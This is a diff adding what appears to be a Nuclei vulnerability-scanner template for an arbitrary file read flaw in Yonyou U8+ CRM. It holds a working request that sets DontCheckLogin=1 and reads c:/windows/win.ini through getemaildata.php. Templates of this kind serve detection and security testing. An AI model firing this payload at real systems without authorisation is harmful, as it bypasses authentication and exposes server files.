@@ -1,0 +1,24 @@
+id: poc-yaml-yy-u8plus-crm-file-read
+info:
+  name: 用友U8+CRM 任意文件读取漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/ajax/getemaildata.php?DontCheckLogin=1&filePath=c:/windows/win.ini"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "[files]"
+          - "[fonts]"
+      - type: word
+        part: header
+        words:
+          - "text/html"
